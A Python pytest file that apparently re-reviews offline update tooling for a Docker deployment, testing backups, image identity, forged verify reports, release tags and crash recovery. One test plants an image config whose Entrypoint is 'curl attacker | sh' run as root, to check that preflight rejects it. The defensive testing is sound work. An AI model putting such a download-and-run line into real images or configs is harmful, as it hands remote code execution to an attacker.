"""Phase 12D4 re-review: offline update tooling, package format 2.

Same means as tests/test_offline_package.py: ``docker`` is the stateful fake of
that module (there is no Docker daemon in Cloud); git, tar, SHA-256 are real.
Everything a real Docker engine / Compose would have to confirm is listed in
docs/review/PHASE12D4_WINDOWS_ACCEPTANCE_CHECKLIST.md.

Phase 12D5, package trust and image identity (package format 3): R2-06, R2-07, R2-08
and R2-09 are fixed; their strict xfail markers are removed (the tests are regression
tests now) and the control that recorded the R2-07 defect is inverted (`# was:`).
"""

# ruff: noqa: F811 - pytest fixtures imported from tests/test_offline_package.py are used as parameters
from __future__ import annotations

import inspect
import json
import subprocess
from pathlib import Path

import offline_package as OP
import pytest
import test_offline_package as T
from test_offline_package import (  # noqa: F401 - pytest fixtures
    completed,
    deployment,
    fake_docker,
    git_deployment,
    health_server,
    package,
    repo,
)


def _git(checkout: Path, *a: str) -> str:
    return subprocess.run(
        ["git", "-C", str(checkout), *a], check=True, capture_output=True, text=True
    ).stdout.strip()


# --------------------------------------------------------------------------- #
# R2-04 (F-08 partially fixed): a backup is reused on resume because it is
# "fresh" by the clock, although the data changed after it was taken
# --------------------------------------------------------------------------- #


@pytest.mark.xfail(
    strict=True,
    reason="PHASE12D4 R2-04 / F-08 PARTIALLY FIXED: BACKUP_MAX_AGE_MINUTES is a time-to-live, "
    "not evidence that the data is unchanged; the application keeps serving users between "
    "the backup and the recreate",
)
def test_r2_04_resume_takes_a_new_backup_when_the_data_changed(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = T._with_backup_cmd(conf, tmp_path)
    fake_docker.edit(lambda s: s["rapidocr"].update(copied={}, on_volume=[]))
    assert (
        T._server("update", conf, pkg_dir, "--apply") == OP.EXIT_UPDATE
    )  # stops before the recreate
    assert T._backups(marker) == 1
    # the application was never put into maintenance: users kept working
    fake_docker.edit(
        lambda s: s["counts"].update(source=135, note=44, source_embedding=6100)
    )
    assert (
        T._server("update", conf, pkg_dir, "--apply", "--accept-missing-rapidocr") == 0
    )
    assert (
        T._backups(marker) == 2
    )  # EXPECTED: the backup that precedes the recreate is new


def test_control_r2_04_backup_runs_while_the_application_still_serves_users(
    deployment, fake_docker, tmp_path
):
    """Evidence for R2-04: the backup command runs before any recreate, i.e. while
    the application is in NORMAL mode (ports open); nothing quiesces writes."""
    conf, pkg_dir, _ = deployment
    probe = tmp_path / "ports-at-backup.json"
    state = fake_docker.path
    T._set_conf(
        conf,
        BACKUP_CMD=f"python3 -c \"import json;print(json.dumps(json.load(open('{state}'))['containers']['c1']['ports']))\" > {probe}",
        BACKUP_VERIFY_CMD="true",
    )
    assert T._server("update", conf, pkg_dir, "--apply") == 0
    ports = json.loads(probe.read_text())
    assert (
        ports["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    )  # users could still write during the backup
    journal = T._journal(tmp_path)
    assert (
        journal["baseline"]["counts"] == journal["reference"]["counts"]
    )  # only the row COUNT is compared


# --------------------------------------------------------------------------- #
# R2-05: the per-recreate reference of `finish` hides a loss that happened after
# the update; in normal mode only "table became empty" fails
# --------------------------------------------------------------------------- #


@pytest.mark.xfail(
    strict=True,
    reason="PHASE12D4 R2-05: finish takes a fresh reference, so rows lost between `update` and "
    "`finish` (while in maintenance, where only the operator works) are not seen",
)
def test_r2_05_finish_notices_rows_lost_since_the_update(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert T._apply(conf, pkg_dir) == 0  # awaiting approval, maintenance mode
    # e.g. a background job of the new version deleted half of the embeddings
    fake_docker.edit(
        lambda s: s["counts"].update(source_embedding=2700, source_insight=3)
    )
    assert (
        T._finish(conf) != 0
    )  # EXPECTED: not "completed" without an explicit decision


@pytest.mark.xfail(
    strict=True,
    reason="PHASE12D4 R2-05: in normal mode a partial loss during the recreate passes "
    "(only a table going from rows to zero fails); counts are not record identity",
)
def test_r2_05_partial_loss_during_finish_is_not_success(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert T._apply(conf, pkg_dir) == 0
    lost = dict(
        fake_docker.get()["counts"], source=7, source_embedding=40
    )  # 120 -> 7, 5400 -> 40
    fake_docker.set(on_up={"counts": lost})
    assert T._finish(conf) != 0


def test_control_r2_05_counts_verdict_normal_mode():
    before = {"source": 120, "source_embedding": 5400}
    assert (
        OP.counts_verdict(before, {"source": 1, "source_embedding": 1}, False)[0]
        is True
    )
    assert (
        OP.counts_verdict(before, {"source": 120, "source_embedding": 5400}, True)[0]
        is True
    )


# --------------------------------------------------------------------------- #
# R2-06 (F-20 partially fixed): "same layers" is accepted as "same image"
# --------------------------------------------------------------------------- #


# PHASE12D4 R2-06 / F-20: fixed in Phase 12D5 (layers + run configuration + platform):
# the xfail marker is removed, this is a regression test.
def test_r2_06_same_layers_other_config_is_not_the_same_image():
    packaged = json.loads(T.NEW_CONFIG)
    image = {
        "id": T.IMAGE_ID,
        "config_digest": T.IMAGE_ID,
        "diff_ids": packaged["rootfs"]["diff_ids"],
    }
    other = (
        "sha256:" + "7" * 64
    )  # e.g. the same layers committed with ENTRYPOINT ["/bin/sh","-c","…"]
    assert OP.same_image(other, packaged["rootfs"]["diff_ids"], image) is None


# PHASE12D4 R2-06: fixed in Phase 12D5: the xfail marker is removed (regression test).
def test_r2_06_preflight_refuses_a_same_layer_different_config_tag(
    deployment, fake_docker
):
    conf, pkg_dir, _ = deployment
    config = json.loads(T.NEW_CONFIG)
    config["config"] = {
        "Entrypoint": ["/bin/sh", "-c", "curl attacker | sh"],
        "User": "root",
    }
    text = json.dumps(config, sort_keys=True)
    other = T._config_id(text)

    def plant(s):
        s["images"][T.TARGET] = other
        s["image_configs"][other] = text

    fake_docker.edit(plant)
    assert (
        T._server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


# --------------------------------------------------------------------------- #
# R2-07 (F-26 partially fixed): verify-report.json is trusted but not protected
# --------------------------------------------------------------------------- #


# PHASE12D4 R2-07 / F-26a: fixed in Phase 12D5 (trusted record in STATE_DIR/verified,
# signature policy, folder ownership): the xfail marker is removed (regression test).
def test_r2_07_forged_verify_report_is_not_accepted(deployment):
    conf, pkg_dir, _ = deployment
    manifest_path = pkg_dir / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["application"]["supported_source_versions"].append(
        "0.9.0"
    )  # any change at all
    manifest_path.write_text(json.dumps(manifest))
    report_path = pkg_dir.parent / "verify-report.json"
    report = json.loads(report_path.read_text())
    report["manifest_sha256"] = OP.sha256_file(
        manifest_path
    )  # the attacker updates the report too
    report["signed"] = False
    report_path.write_text(json.dumps(report))
    assert (
        T._server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


# was: test_control_r2_07_the_extraction_folder_is_not_checked_for_ownership (PHASE12D4 control, R2-07)
def test_control_r2_07_the_extraction_folder_is_checked_for_ownership(deployment):
    source = inspect.getsource(OP.load_package)
    assert "_check_package_tree" in source and "find_trusted_report" in source
    assert "st_uid" in inspect.getsource(OP._check_package_tree)
    conf, pkg_dir, _ = deployment
    pkg_dir.chmod(0o777)  # anybody could replace the package after verification
    assert (
        T._server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


# --------------------------------------------------------------------------- #
# R2-08: nothing ties the packaged image to the packaged commit unless a label
# happens to be present
# --------------------------------------------------------------------------- #


# PHASE12D4 R2-08: fixed in Phase 12D5 (revision label == commit and /app/VERSION are
# required): the xfail marker is removed, this is a regression test.
def test_r2_08_build_refuses_an_image_without_a_revision_label(
    fake_docker, repo, tmp_path
):
    assert fake_docker.get()["labels"] == {}  # no proof which commit built the image
    assert T._build_rc(repo, tmp_path / "dist") == OP.EXIT_USAGE


# --------------------------------------------------------------------------- #
# R2-09: an existing release tag that points elsewhere is silently kept
# --------------------------------------------------------------------------- #


# PHASE12D4 R2-09: fixed in Phase 12D5: the xfail marker is removed (regression test).
def test_r2_09_existing_release_tag_on_another_commit_is_refused(
    deployment, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    server = T._server_checkout(tmp_path, repo)
    manifest = OP.load_package(str(pkg_dir))
    tag = manifest["application"]["release_tag"]
    _git(server, "tag", tag, "v1.2.0")  # same name, older commit
    with pytest.raises(OP.Refused):
        T._sync(conf, server, pkg_dir)


# --------------------------------------------------------------------------- #
# R2-10 (F-22 partially fixed): the health probe cannot tell real token counting
# from the word-count fallback
# --------------------------------------------------------------------------- #


@pytest.mark.xfail(
    strict=True,
    reason="PHASE12D4 R2-10 / F-22 PARTIALLY FIXED: step O calls chunk_text(), which also "
    "'works' on the word-count fallback; it never asserts that the o200k_base encoding loads",
)
def test_r2_10_health_probe_asserts_the_encoding_itself():
    source = inspect.getsource(OP.health_checks)
    assert "get_encoding" in source


def test_regression_r2_10_offline_without_cache_refuses_instead_of_one_chunk(
    monkeypatch,
):
    """was: test_control_r2_10_fallback_makes_one_chunk_of_a_text_without_spaces -
    with OCR_OFFLINE=true and no cache the estimate was words * 1.3: a 160 000
    character run without whitespace counted as 1 token and became ONE chunk.
    Phase 12D5: offline never estimates - TokenizerUnavailableError, no chunk."""
    monkeypatch.setenv("OCR_OFFLINE", "true")
    monkeypatch.setenv("TIKTOKEN_CACHE_DIR", "/nonexistent-tiktoken-cache")
    from open_notebook.utils import token_utils
    from open_notebook.utils.chunking import chunk_text

    blob = "A1B2C3D4" * 20000
    with pytest.raises(token_utils.TokenizerUnavailableError):
        token_utils.token_count(blob)
    with pytest.raises(token_utils.TokenizerUnavailableError):
        chunk_text(blob)


def test_regression_r2_10_context_building_goes_through_the_guard(monkeypatch):
    """was: test_control_r2_10_other_call_sites_load_the_encoding_without_the_guard -
    context_builder called tiktoken.get_encoding("o200k_base") itself, twice
    (RAG context building, unguarded: could hang offline)."""
    text = (T.ROOT / "open_notebook" / "utils" / "context_builder.py").read_text(
        encoding="utf-8"
    )
    assert "tiktoken.get_encoding" not in text
    monkeypatch.setenv("OCR_OFFLINE", "true")
    monkeypatch.setenv("TIKTOKEN_CACHE_DIR", "/nonexistent-tiktoken-cache")
    from open_notebook.utils import context_builder, token_utils

    with pytest.raises(token_utils.TokenizerUnavailableError):
        context_builder._rendered_source_context_tokens(
            {"id": "source:1", "title": "t", "full_text": "A1B2C3D4" * 20000},
            [],
            context_builder._TOKENIZER_UNSET,
        )


# --------------------------------------------------------------------------- #
# Interruption: things this review checked and found to hold
# --------------------------------------------------------------------------- #


def test_verified_crash_between_recreate_and_journal_step_is_recoverable(
    deployment, fake_docker, tmp_path, monkeypatch
):
    """Killed right after `compose up` and before the journal records it: the
    journal still says in_progress / nothing recreated, the container already
    runs the new image. A new update is refused; rollback restores the baseline."""
    conf, pkg_dir, _ = deployment
    real_step = OP.Journal.step

    def dying_step(self, name, **info):
        if name == "N_recreated":
            raise KeyboardInterrupt("power loss")
        return real_step(self, name, **info)

    monkeypatch.setattr(OP.Journal, "step", dying_step)
    with pytest.raises(KeyboardInterrupt):
        T._apply(conf, pkg_dir)
    monkeypatch.setattr(OP.Journal, "step", real_step)
    journal = T._journal(tmp_path)
    assert journal["status"] == "in_progress"
    assert "N_recreated" not in [s["step"] for s in journal["steps"]]
    assert fake_docker.app()["image_id"] == T.IMAGE_ID  # new image is running
    assert (
        T._apply(conf, pkg_dir, "--allow-version-mismatch") == OP.EXIT_UPDATE
    )  # no blind resume
    assert T._finish(conf) == OP.EXIT_UPDATE
    assert T._rollback(conf, "interrupted") == 0
    assert fake_docker.app()["image_id"] == T.OLD_ID
    assert T._journal(tmp_path)["status"] == "rolled_back"


def test_verified_three_updates_and_rollbacks_return_to_the_right_images(
    deployment, fake_docker, repo, tmp_path
):
    """update A -> finish -> update B -> rollback (to A) -> update B -> finish ->
    rollback (to A again, not to v1.2.0)."""
    conf, pkg_dir, _ = deployment
    marker = T._with_backup_cmd(conf, tmp_path)
    assert T._server("update", conf, pkg_dir, "--apply") == 0 and T._finish(conf) == 0
    (repo / "VERSION").write_text("1.3.1\n")
    _git(repo, "commit", "-qam", "1.3.1")
    fake_docker.edit(lambda s: s["inventory"].update(app_version="1.3.1"))
    pkg2, digest2 = T._build(
        repo, tmp_path, "--supported-from", "1.3.0", version="1.3.1", out="dist2"
    )
    pkg_dir2 = T._unpack_on_server(fake_docker, pkg2, digest2, tmp_path / "pkgx2")
    assert T._server("update", conf, pkg_dir2, "--apply") == 0
    assert T._rollback(conf) == 0 and fake_docker.app()["image_id"] == T.IMAGE_ID
    assert T._server("update", conf, pkg_dir2, "--apply") == 0 and T._finish(conf) == 0
    assert fake_docker.app()["image_id"] == T.NEXT_ID
    assert T._rollback(conf, "app", "--no-maintenance") == 0
    assert fake_docker.app()["image_id"] == T.IMAGE_ID
    assert T._backups(marker) == 3  # one per attempt
    assert len(list((tmp_path / "state" / "journals").glob("*.json"))) == 2


def test_verified_pin_does_not_survive_an_explicit_file_list_for_the_environment(
    completed, fake_docker, capsys
):
    """F-11 as fixed: after `pin --apply` an operator script that passes `-f
    docker-compose.yml` explicitly (COMPOSE_FILE is then ignored) keeps the new
    IMAGE but loses the offline variables. It is detected (exit 7), not prevented."""
    conf, _, deploy = completed
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    T._plain_compose_up(deploy)  # == docker compose -f docker-compose.yml up -d
    app = fake_docker.app()
    assert app["image_id"] == T.IMAGE_ID
    assert (
        "OCR_OFFLINE" not in app["env"] and "OCR_RAPIDOCR_PERSISTENT" not in app["env"]
    )
    capsys.readouterr()
    assert T._status(conf) == OP.EXIT_DRIFT
    assert "ENVIRONMENT DRIFT" in capsys.readouterr().out


def test_verified_without_a_pin_nothing_prevents_the_old_image(completed, fake_docker):
    """The pin is optional: by default a plain `docker compose up -d` (operator
    script, boot guard) brings the OLD image back. Only status / health say so."""
    conf, _, deploy = completed
    T._plain_compose_up(deploy)
    assert fake_docker.app()["image_id"] == T.OLD_ID
    assert T._status(conf) == OP.EXIT_DRIFT


def test_verified_unauthenticated_archive_is_never_written(package, tmp_path):
    pkg, _ = package
    dest = tmp_path / "x"
    assert T._verify(pkg, dest) == OP.EXIT_VERIFY
    assert not dest.exists() and not list(tmp_path.glob("x.partial-*"))
